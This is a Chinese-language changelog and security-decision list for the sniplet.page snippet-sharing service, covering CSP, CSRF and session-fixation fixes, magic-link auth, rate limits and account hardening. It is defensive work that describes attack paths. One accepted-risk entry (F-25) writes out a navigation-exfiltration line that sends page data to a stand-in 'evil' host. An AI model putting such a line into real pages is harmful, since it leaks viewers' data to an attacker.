**當前版本:v0.8.15(2026-04-22)** — 第八輪 audit MEDIUM(M-2 ~ M-6)全清 + H-6 `/v1/csp-report` 加量級保護 + RUNBOOK §9 新增 CF account security。

### v0.8.15 重點變更(相對 v0.8.14)

**Operational maturity(新增 F-40 ~ F-42)**:

- **F-40(P2)`/v1/csp-report` rate limit + body cap + CT 白名單**(H-6 採行 option a):此 endpoint 依 CSP spec 無法認證 + 無法限 Origin,是 DoS / Analytics 燒配額的高價值目標。新加三層:per-IP `rl_csp:*:minute` 100/min → 429;body > 8KB → 413;CT 非 `application/csp-report` / `application/json` → 400。超限觸發 `csp_report_rate_limited` event + alert。§8 新 `POST /v1/csp-report` 小節 + §7.17 rate limit 表 + §7.18 events + §11 checklist + §16 errors 全面更新

- **F-41(P2)`MAGIC_CONSUMED_KV` eventual-consistency replay race 明文 document**(M-2 採行 option a):§7.3 新段明列「攻擊者需精準時間同步 + 預先持 magic JWT + KV 複製 <10 秒 window」三嚴格前提;現有 `auth_consumed outcome=replay` alert(> 10/hr)為偵測;v2 升 Durable Objects 為升級路徑。不改現行實作,將原本「隱藏的假設」變「明列的接受」

- **F-42(P1)owner operation audit log**(M-3 採行 option a):PATCH viewers 與 DELETE sniplet 成功後寫 `sniplet_mutated { action, slug_hash(SHA-256) }` Analytics event;owner_token 洩漏時 operator 可從 spike 偵測批量濫用。slug 僅 hash 不存明文,符合 §7.22 logging hygiene。§7.18 events 表 + §8 PATCH / DELETE side effects + RUNBOOK §4 alerts + §11 checklist 更新

**Doc 一致性修正**:

- **M-6**:`/auth/request` timing 閾值在 §7.10 / §7.17 / §11 三處文字統一 — 「設計目標 < 5ms,測試 SLO < 20ms」;實作以 5ms 為目標,測試以 20ms 為 pass 門檻(容 CF PoP 差異)

- **M-5**:新加 `sniplet_404_miss { ip_hash }` Analytics event + 「單 ip_hash > 200/hour」alert,補 slug enumeration 監控缺口(Bot Fight Mode 對低速分散式枚舉不敏感)

**Operational hardening(RUNBOOK)**:

- **M-4 RUNBOOK §9 Cloudflare account 與 Wrangler security**(新章節):CF account 是最上游的 attack surface,新章節涵蓋:
  - 9.1 Account 層 hardening(2FA 須 hardware key / TOTP,不用 SMS;recovery code 離線;login email 獨立;定期登出;login notification)
  - 9.2 API Token scope minimization(不用 Global Key;each use case 獨立 token + 最小 permission + IP restrict + TTL;洩漏處置流程)
  - 9.3 Wrangler 本機 hygiene(`.env` / `.dev.vars` 必須 gitignore;`wrangler secret put` 為唯一 secret 通路;`wrangler tail` 勿長期掛 prod;CI token 用 deploy-only scope)
  - 9.4 Account 接管的偵測與復原(登入異常、未授權 deploy、R2/KV 異常刪除、Resend API key 通知等訊號 + 6 步復原流程)

**風險表新增 #50 ~ #52**(對應 F-40 ~ F-42);**決策表新增 #72 ~ #74**。

**本版不處理**:
- §5 User Stories / Journeys / Personas 結構化:**留 v0.9.0 處理**(pre-implementation 最後一版大改)

### v0.8.14 重點變更(相對 v0.8.13)

**新增 F-35 ~ F-39(P0/P1/P2 依嚴重度分類)**:

- **F-35(P0)/auth/consume Origin + Content-Type 檢查**:擋 session fixation CSRF。攻擊者原可用 `Content-Type: text/plain` simple-request(繞 CORS preflight)把自己的 magic token 塞給 `/auth/consume`,server `Set-Cookie` 讓受害 browser 覆寫成攻擊者 session。修法:MUST `Origin === https://sniplet.page` + `Content-Type: application/json`,否則 400。§8 `/auth/consume` 前置檢查 + §8.0 通用 invariants + §16 errors 更新

- **F-36(P0)/auth/consume `return_to` 權威來源改為 JWT claim**:原 body `r` 受信任 + JWT 也有 `return_to` 但未交叉比對,email 被轉寄 / browser history / MITM 可在 magic link URL 加 `&r=` 劫持 post-login redirect。修法:`return_to` 只從 JWT claim 取,body 簡化為 `{ "t": <jwt> }`,verify page URL 也移除 `&r=` query。§7.13 + §8 + §10.4 更新

- **F-37(P1)通用 POST `Content-Type: application/json` enforce**:§8.0 新增「通用 POST invariants」節,所有 JSON 端點(POST /v1/sniplets、PATCH viewers、/auth/request、/auth/consume)MUST 檢 CT,擋 `<form enctype="text/plain">` simple-request CSRF;`/v1/csp-report` 例外(同時接受 `application/csp-report`)

- **F-38(P0)`Permissions-Policy` header**:CSP 管不到的 Device API(geolocation / camera / mic / payment / WebAuthn / USB / 感測器 / 螢幕錄製 / clipboard-read / FLoC 等)全 `<feature>=()` 禁用,擋 creator HTML 做 phishing permission prompt。`clipboard-write` 不禁(保 copy-to-clipboard UX)。§7.19 security headers 表 + 新 rationale 段

- **F-39(P2)DMARC record**:`_dmarc.sniplet.page TXT "v=DMARC1; p=reject; adkim=s; aspf=s; rua=mailto:security@sniplet.page"`,擋第三方偽造 `From: sniplet.page` 寄 phishing magic link。RUNBOOK §7 setup checklist + §17 timeline 0–1hr + §11 P2 checklist 更新

**新增 §8.0 通用 POST invariants 節**:集中規範 Content-Type 與 Origin 的強制層,避免 per-endpoint 重複敘述 + 實作遺漏。

**CSP allowlist 調整(非安全修,UX 回補)**:
- `script-src` 加回 `https://cdn.tailwindcss.com`:Tailwind Play CDN 是 v3+ JIT 唯一支援 hosting,AI 生成 HTML 極常用 utility class。`style-src` 不需加(Play CDN 走 JS 注入 `<style>`,`'unsafe-inline'` 已 cover)
- F-26 supply chain 範圍從「cdnjs 單家」擴大為「cdnjs + tailwindcss 兩處」;決策表 #56、SKILL.md HTML constraints 同步更新

**風險表新增 #45 ~ #49**(對應 F-35 ~ F-39);**決策表新增 #66 ~ #71**(同上 + Tailwind)。

**本版不處理**:
- M-1 ~ M-6 audit 發現(見第七輪 audit 報告):v0.8.15+ 評估
- H-6 `/v1/csp-report` rate limit / CT 驗證:v0.8.15+ 或待使用者決定

### v0.8.13 重點變更(相對 v0.8.12)

**CSP 調整**:
- **`script-src` / `style-src` allowlist 收斂至 `https://cdnjs.cloudflare.com` 單家**:jsdelivr / unpkg 為 npm 自動 mirror,攻擊者可透過 `npm publish` 繞過,allowlist 安全意義低;cdnjs 有人工審核,保留作為兼顧 takedown 槓桿與 UX 的唯一 allowlist 項。script-src / style-src 的**真正 sandbox 職責**是 `connect-src 'none'` + `img-src data: blob:` + `form-action 'none'`(管行為),allowlist 只管來源,兩者正交
- §7.19 CSP 規則表、§11 checklist P0 CSP allowlist 測試案例、風險表 #39(CDN supply chain row)、決策表 #56、F-26 同步更新

**Apex 行為收斂**:
- **`GET /` 與 `GET /SKILL.md` 永遠回 SKILL.md text/plain**(取消 Accept 分流的 HTML 簡頁分支);headers `Content-Type: text/plain; charset=utf-8`、`Content-Disposition: inline; filename="SKILL.md"`、`Cache-Control: public, max-age=3600`
- 設計理由:sniplet.page 是 AI agent 的 share button,不假裝是 SaaS landing;單一 contract(SKILL.md)即域名背後的全部產品。Browser 訪客肉眼可讀 monospace,「另存新檔」/`curl -O` 自然命名為 `SKILL.md`;agent 不必學 Accept dispatch
- §10.1 表、§10.2 整節重寫、§7.5 路由表加 `/SKILL.md` row、§8 對應 endpoint section、§11 checklist、決策表 #10、§17 timeline 同步更新
- **Known Issues / Advisories 段落從 apex 移至 `sniplet.page/security#advisories`**(§10.7 加段);決策表 #58、RUNBOOK §3.2 / §3.3 / §7 setup checklist 同步更新;原 GitHub README channel 因 repo 改 private 已不可行

**檔名 + repo**:
- `git mv sniplet-page-skill.md → SKILL.md`(歷史保留)
- 決策表 #21 GitHub repo URL 從 TBD 鎖定為 `github.com:xpsteven/sniplet`(private);SKILL.md 對外不依賴 GitHub raw URL

**SKILL.md 內容**:
- HTML constraints 節改寫 external JS libraries 的 allowlist 為 cdnjs;提示 creator 遇到 cdnjs 缺的 lib 時改 inline 或找替代
- **新增 `## Where to learn more` 尾段**列 `/security`、`/.well-known/security.txt`、`/security#advisories` 連結 + `curl -O` 重新下載指令(讓人類肉眼掃 raw text 即可找到 /security)

**Session TTL 縮短**:
- Session cookie `Max-Age` 從 `2592000`(30 天)縮為 `604800`(7 天),與 sniplet TTL 對齊;F-29 leaked cookie window 從 30 天縮為 7 天;cross-sniplet session 重用體驗仍存在(sniplet 7 天就過期,30 天的 session 對 UX 沒有實質貢獻);RUNBOOK §1 secret 用途、§2.2 graceful rotation 時間表、§3.4 SEV-3 劇本同步更新

**本版不處理**(承繼 v0.8.12 記錄):
- `/v1/csp-report` rate limit、`Permissions-Policy` header:v0.8.14+ 或 v2 處理
- H-1~H-5(audit 中已接受未落稿)亦留 v0.8.14 一併補

### v0.8.12 重點變更(相對 v0.8.11)

**安全增強**(第六輪審計發現的三個 HIGH):
- **F-32 `/auth/request` 全站 send cap**:防 attacker 用 botnet + 部分真實 email 打爆 Resend 配額。KV counter `auth_send_daily:<date>`,僅在實際 `ctx.waitUntil(resend.send)` path 計數;peek 在 whitelist lookup **之前**,雙 path 一致 → 不破 Strategy C;超過 cap 回 503 `service_unavailable`;ops alert `auth_global_cap_hit`。Cap 預設 100/day(對齊 Resend 免費 tier),升 tier 時 bump
- **F-33 Owner 操作 status code 統一**:`DELETE` / `PATCH` 的「slug 不存在」與「token 錯」原本分別回 404 / 401,形成 free slug enumeration oracle。現一律回 `401 invalid_token`,用 constant-time + dummy hash 維持 timing 一致;`410 expired` 僅在 valid token 驗證通過後可見。§8 加獨立「Owner 操作驗證順序」小節
- **F-34 R2 create-only 寫入**:`put` 加 `onlyIf: { etagDoesNotMatch: '*' }`,`PreconditionFailed` 作為 postfix 碰撞訊號,避免並發 POST 抽到同一 postfix 時後寫者覆蓋前者。§7.15 明禁「先 head 再 put」的 TOCTOU race 寫法

**本版不處理**(已評估,接受為 v1 or later):
- GDPR Art 17 self-service erasure:台灣 PDPA 無對應條款,v1 依 §8 takedown 手動流程兜底;EU 使用者若出現再評估
- `/v1/csp-report` rate limit、`Permissions-Policy` header、session TTL 與 sniplet TTL 對齊:MEDIUM / LOW 議題,v0.8.13+ 或 v2 處理

### v0.8.11 重點變更(相對 v0.8.10)

**架構級**:
- **F-11 升 v1**:`meta.viewers[]` 改存 `{ h: HMAC, m: masked }`;JWT `sub`(session + magic)也改用 HMAC(`EMAIL_HASH_SECRET`);R2 / cookie 外洩不再直接等於完整 email 外洩
- **移除 `SECURITY.md` 檔**:改為 Worker serve `sniplet.page/security` page(§10.7)+ RFC 9116 `/.well-known/security.txt`(§10.8);符合非 open-source 公開服務慣例
- **API routing 新增 `POST /v1/csp-report`**:第四輪審計的 CSP report endpoint 原本遺漏未列,補齊

**安全增強**:
- **`/auth/logout` 加 Origin header 檢查**(S-6):擋跨站 CSRF logout(`SameSite=Lax` 無法擋此情境,`Set-Cookie: Max-Age=0` 無條件清 cookie)
- **API Worker 明示忽略 session cookie**(S-3):§7.20 + §7.22 紀律要求 api subdomain MUST NOT 讀 / log `Cookie` header
- **授權 re-check invariant 明寫為 MUST**:§7.20 強調「每次 GET 私享 sniplet 都必須重 load `meta.viewers[].h` 與 cookie `sub` 比對」,確保 PATCH 移除 viewer 立即生效
- **CORS / return_to regex 統一 + 對齊實際 slug 範圍**(8–45 字元);原先 CORS `{0,38}` 會擋掉 long-slug 私享 auth

**可觀測性**:
- **CSP 加 `report-to` + `Reporting-Endpoints` header**(S-1):向現行 W3C Reporting API 標準靠齊,`report-uri` 保留為舊瀏覽器相容

**文件 / PRD 內部一致性**:
- **skill.md localStorage 說明**:刪 path-based 時代遺留的「跨 sniplet 共用 storage」警告,改為「每個 sniplet 自己的 origin,localStorage 隔離」
- **skill.md 加 XSS escape 提醒**:`unsafe-inline` 下 creator 若嵌入使用者資料需 HTML-escape
- **EMAIL_INDEX_KV TTL 明定為 sniplet TTL**(§7.10):RUNBOOK §2.4 dual-compute migration 依賴此 TTL
- **RUNBOOK §2.4 `EMAIL_HASH_SECRET` 輪換重寫**:因 F-11 現在影響 index + R2 meta.viewers + session 三處,migration 需 dual-compute 或接受既有 sniplet 7 天斷鏈
- **RUNBOOK 新增 §3.4 SEV-3 劇本**(cookie 外洩回報)

**風險表更新**:
- F-29(session cookie 外洩無 per-user revocation)、F-30(logout CSRF)、F-31(API cookie 紀律)新增
- F-11 標示為 v0.8.11 升 v1 解決;風險 20 劃線

### v0.8.10 重點變更(相對 v0.8.9)

**架構級**:
- URL 結構:**path-based → subdomain-based**(`{slug}.sniplet.page`),wildcard DNS + Universal SSL wildcard cert
- Slug 策略:**衝突才 postfix → 永遠 postfix**(防品牌挪用 / phishing 混淆)
- Session cookie:**host-only → `Domain=sniplet.page`**(支援跨 sniplet session 共享)
- **移除 Fetch Metadata / COOP / §7.23 整套**:subdomain 架構下 SOP 天然解決 cross-sniplet isolation
- **統一嚴格 CSP**:不分 public/private,定位從 "跨 sniplet 防線" 改為 "per-sniplet sandbox + platform abuse 防線"
- **移除 edge cache**:ROI 低,invalidation 複雜度不值

**安全增強**:
- **兩段式 auth + one-shot token**:`GET /auth/verify` 確認頁不 consume,`POST /auth/consume` 實際驗證 + `MAGIC_CONSUMED_KV` 防 replay;根本解決 email scanner 預取 + magic link cloud-sync 放大效應
- **`/auth/request` per-IP rate limit**:30/day per /64,防 attacker DoS 合法 viewer 的 email quota
- **CF Log Push hygiene**:ops setup 強制確認

**Bug fix**:
- `crypto.subtle.timingSafeEqual` API 不存在 → 改指引 `node:crypto` 的 `timingSafeEqual` 或手寫 constant-time loop

**Doc 精煉**:
- RUNBOOK `EMAIL_HASH_SECRET` 輪換補 dual-write migration 流程
- RUNBOOK `IP_HASH_SECRET` 輪換補 abuse trace 斷鏈說明
- Skill frontmatter name:`sniplet-share` → `sniplet-page-share`
- Status page 策略:v1 不做,改用 `sniplet.page/security#advisories` 段落(v0.8.13 從 GitHub README 改,因 repo 改 private)
- `return_to` 驗證限縮到 slug pathname 格式

Draft 階段更早的 changelog 不保留;讀者只需關注當前規格。

---

## 關鍵安全與營運決策清單(F-1 ~ F-42,v0.8.15 更新)

v0.8.9 的 F-20 / F-22 / F-23(舊)因架構變更已移除;v0.8.10 新增 F-24 ~ F-27;v0.8.11 新增 F-29 ~ F-31、F-11 升 P0;v0.8.12 新增 F-32 ~ F-34;v0.8.14 新增 F-35 ~ F-39(承接第七輪 audit H-1 ~ H-5);v0.8.15 新增 F-40 ~ F-42(承接第八輪 audit MEDIUM + H-6)。跳號 F-28 保留給 v0.8.11 審計中未觸發的額外發現(目前空)。

**P0(必修)**:
- **F-1 IP hash 用 HMAC**:`IP_HASH_SECRET`;meta.json `ip_hash`、per-IP quota KV key 皆走 `HMAC-SHA256`
- **F-2 Session cookie `Domain=sniplet.page`**(v0.8.10 從 host-only 改):支援跨 sniplet session 共享
- **F-3 `/auth/request` timing 消除**:Resend 用 `ctx.waitUntil()` defer;設計目標 hit/miss latency 差 < 5ms
- **F-6 One-shot magic token + 兩段式 auth**(v0.8.10 從 v2 roadmap 升 v1):`MAGIC_CONSUMED_KV` jti 防 replay;`/auth/verify` 確認頁不 consume,`/auth/consume` 實際驗證;防 email scanner 預取 + cloud-sync 放大
- **F-11 viewer email HMAC + masked 儲存**(v0.8.11 從 v2 升 v1):`meta.viewers[]` 改為 `{ h: HMAC, m: masked }`;JWT `sub` 亦為 HMAC;R2 / cookie 外洩不再等於完整 email 外洩
- **F-13 統一嚴格 CSP**(v0.8.10 從 v2 roadmap 升 v1):所有 sniplet 共用;`connect-src 'none'` + CDN allowlist;per-sniplet sandbox

**P1(應修)**:
- **F-4 XFO DENY**(CSP `frame-ancestors 'none'` 併入統一 CSP)
- **F-5 JWT secret 拆分** `SESSION_JWT_SECRET` / `MAGIC_JWT_SECRET`
- **F-7 Resend 失敗 ops alert** `resend_send_failed`
- **F-8 KV 並發繞過 documented**(daily cap 1000 兜底,v2 升 CF Rate Limiting Rules)
- **F-21 IPv6 per-IP normalize 到 /64**
- **F-23 `/auth/request` per-IP rate limit 30/day**(v0.8.10 加):防 DoS 合法 viewer email quota
- **F-32 `/auth/request` 全站 send daily cap**(v0.8.12 加):防 botnet + 部分真實 email 燒 Resend 配額;`METER_KV` counter 僅在實際 send 計數;peek-before-lookup 的 B2 方案保 Strategy C timing;cap 預設 100/day
- **F-33 Owner 操作 status code 統一**(v0.8.12 加):`DELETE` / `PATCH` 的 slug-not-found 與 token-mismatch 統一回 401,消除 slug enumeration free oracle;constant-time + dummy hash 保 latency 一致
- **F-34 R2 create-only 寫入**(v0.8.12 加):`put` 帶 `onlyIf: { etagDoesNotMatch: '*' }`,PreconditionFailed 觸發 postfix retry;避免並發 POST 同 postfix 覆寫
- **F-35 `/auth/consume` Origin + Content-Type 檢查**(v0.8.14 加):session fixation CSRF 的根本解;Eve 無法用 `Content-Type: text/plain` simple-request 把自己 token 塞成 Alice 的 session cookie;Origin MUST `https://sniplet.page`、CT MUST `application/json`
- **F-36 `/auth/consume` `return_to` 只信 JWT claim**(v0.8.14 加):body `r` 不信任;擋 email 轉寄 / URL tampering 劫持 post-login redirect;body 簡化為 `{t}`,verify page URL 移除 `&r=`
- **F-37 通用 POST `Content-Type: application/json` enforce**(v0.8.14 加):§8.0 通用 invariants;擋 `<form enctype="text/plain">` simple-request CSRF;`/v1/csp-report` 例外(同時接受 `application/csp-report`)
- **F-38 `Permissions-Policy` header**(v0.8.14 加):CSP 管不到的 Device API(geolocation / camera / mic / payment / WebAuthn / USB / 感測器 / 螢幕錄製 / clipboard-read / FLoC)全禁用;`clipboard-write` 不禁(保 copy-to-clipboard UX);擋 creator HTML 做 phishing permission prompt
- **F-42 Owner 操作 audit event**(v0.8.15 加):PATCH / DELETE 成功後 Analytics 寫 `sniplet_mutated { action, slug_hash(SHA-256) }`;owner_token 洩漏偵測;無 creator identity 所以無法主動通知(v2 creator account 上線一起做)

**P2(接受與 document)**:
- **F-39 DMARC record**(v0.8.14 加):`_dmarc.sniplet.page TXT "v=DMARC1; p=reject; adkim=s; aspf=s; rua=mailto:security@sniplet.page"`;擋第三方偽造 sniplet.page 寄 phishing magic link;初上線可 `p=quarantine` 觀察 7 天再升 reject
- **F-40 `/v1/csp-report` 量級保護**(v0.8.15 加):per-IP 100/min rate limit + body 8KB cap + CT 白名單(`application/csp-report` / `application/json`);擋 DoS 燒 Analytics 配額;`csp_report_rate_limited` event 偵測
- **F-41 `MAGIC_CONSUMED_KV` eventual-consistency replay race 接受 document**(v0.8.15 加):嚴格前提(持他人 JWT + 跨 PoP 精準時間同步 + < 10 秒 window);現有 `auth_consumed outcome=replay` alert 偵測;v2 升 Durable Objects 為升級路徑
- **F-9 過期 sniplet 統一 404**(PATCH/DELETE 帶 owner_token 仍回 410)
- **F-10 Challenge page 文案揭示私享**(永遠 postfix 部分 mitigation)
- ~~F-11 viewer 明文存於 R2 meta.json~~ **v0.8.11 升 P0,已上方列出**
- **F-12 HTML 明文存於 R2**(CF at-rest 對 operator 透明,非 E2E;v3+ 評估)
- **F-14 DNSSEC + CAA record**
- **F-15 Cron 失敗 alert** `cron_cleanup_success`
- **F-16 Secret rotation 流程** → `RUNBOOK.md`(含 `EMAIL_HASH_SECRET` dual-write migration)
- **F-17 Incident response 窗口** → `/security` page(§10.7)+ `/.well-known/security.txt`(§10.8)
- **F-18 GDPR Art 17 erasure v1 不處理**(7 天 TTL 作 data minimization 依據)
- **F-19 Gmail `+tag` / `.` 別名不處理**
- **F-22 Subdomain 架構的 UX 風險**(v0.8.10 加):`{slug}.sniplet.page` URL 在某些 messaging app 可能不 auto-link,ship 前實測 + SKILL.md 提示
- **F-24 CF Log Push hygiene**(v0.8.10 加):ops setup 必須確認未啟用或 Authorization drop
- **F-25 Navigation exfil CSP 不擋**(v0.8.10 加):`location = evil + '?' + data` 需要 viewer 主動點擊離開,attack value 低,接受
- **F-26 CDN supply chain**(v0.8.10 加,v0.8.13 收斂,v0.8.14 加回 Tailwind):script-src allowlist 為 cdnjs + cdn.tailwindcss.com 兩處(v0.8.14 重新納入 Tailwind Play CDN,因 AI 生成 HTML 太常見、Play CDN 是 v3+ JIT 唯一支援 hosting);jsdelivr / unpkg 為 npm auto-mirror 不加(allowlist 擋不下惡意 `npm publish`);接受兩處單點風險,有事件時緊急移除該來源
- **F-27 Team tier 內互信**(v0.8.10 加):v2 `{team}.sniplet.page/{slug}` 形式 team 內 sniplet 共用 subdomain origin,重新進入 same-origin 威脅模型,屆時重新引入軟體層防線(Fetch Metadata 等)
- **F-29 Session cookie 外洩無 per-user revocation**(v0.8.11 S-4b,v0.8.13 縮 window):**7 天**(v0.8.13 從 30 天縮,與 sniplet TTL 對齊)session 被偷 cookie 的攻擊者可 read-only 瀏覽 Alice 白名單私享 sniplet,v1 無 per-user revocation,只有 `SESSION_JWT_SECRET` 全體輪換 nuclear 選項(RUNBOOK §3.4 SEV-3 劇本);嚴重度 LOW,v2 評估 revoke list
- **F-30 `/auth/logout` CSRF**(v0.8.11 S-6):加 `Origin` header 檢查,合法 `sniplet.page` / `*.sniplet.page` 才處理,其他 400 `invalid_origin`
- **F-31 API Worker 忽略 session cookie**(v0.8.11 S-3):`Domain=sniplet.page` 會讓 cookie 散到 api subdomain,紀律上 API Worker MUST NOT 讀 / log cookie(§7.20、§7.22)

**v0.8.10 移除**:
- ~~F-20 COOP for private sniplets~~:subdomain 下 cross-origin window.open 被 SOP 擋
- ~~F-22(舊) Edge cache TTL 60 秒~~:移除 edge cache
- ~~F-23(舊) localStorage 跨 sniplet 共用~~:subdomain 下每個 sniplet 自己的 storage origin
